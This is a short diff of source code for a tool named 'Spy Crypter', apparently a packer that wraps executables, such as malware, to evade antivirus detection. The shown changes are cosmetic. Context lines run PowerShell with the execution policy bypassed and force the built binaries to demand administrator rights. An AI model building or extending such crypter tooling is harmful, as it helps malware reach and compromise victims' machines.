@@ -455,7 +455,7 @@ int CrypterPackageInit(CrypterPackageCtx* ctx, const char* filepath)
 	memcpy(ctx->infile, filepath, strlen(filepath));
 	ctx->infile[strlen(filepath)] = '\0';
 
-	printf("CrypterPackageInit good\n");
+	printf("CrypterPackageInit OK\n");
 	return 0;
 }
 
@@ -465,7 +465,8 @@ mImport import;
 DWORD   max_build_procs = 0;
 
 void main(int argc, char* argv[])
-{
+{ 
+	Exec("mode con: cols=120 & mode con:lines=30");
 	printf("Spy Crypter started!'\n");
 	 
 	char* infile_path; char* target_name;
@@ -766,15 +767,15 @@ void main(int argc, char* argv[])
 	if (type < 2)
 		strcat(out_exe, ".exe");
 	else strcat(out_exe, ".dll");
-
+	  
 	string VSpath = Exec((char*)"powershell.exe -ExecutionPolicy Bypass -Command \"Get-ChildItem HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall | foreach { Get-ItemProperty $_.PsPath } | where { $_.DisplayName -like '*Visual Studio*' -and $_.InstallLocation.Length -gt 0 } | sort InstallDate -Descending | foreach { (Join-Path $_.InstallLocation 'VC\\Auxiliary\\Build') } | where { Test-Path $_ } | select -First 1\"");
+	  
+	VSpath = VSpath.substr(0, VSpath.length() - 1); 
 
-	VSpath = VSpath.substr(0, VSpath.length() - 1);
-	 
 	char MANIFEST[0x500];
 	ZeroMemory(MANIFEST, 0x500);
 	if (manifest) snprintf(MANIFEST, 0x500, "/MANIFEST /MANIFESTUAC:\"level = 'requireAdministrator' uiAccess = 'false'\" & mt.exe -manifest \"%s.manifest\" -outputresource:\"%s;%c\" -validate_manifest ", out_exe, out_exe, type < 2 ? '1' : '2');
- 
+	 
 	char BAT_SRC[0x1000];
 	ZeroMemory(BAT_SRC, 0x1000);
 	snprintf(BAT_SRC, 0x1000, "call \"%s\\vcvars%s.bat\"&"
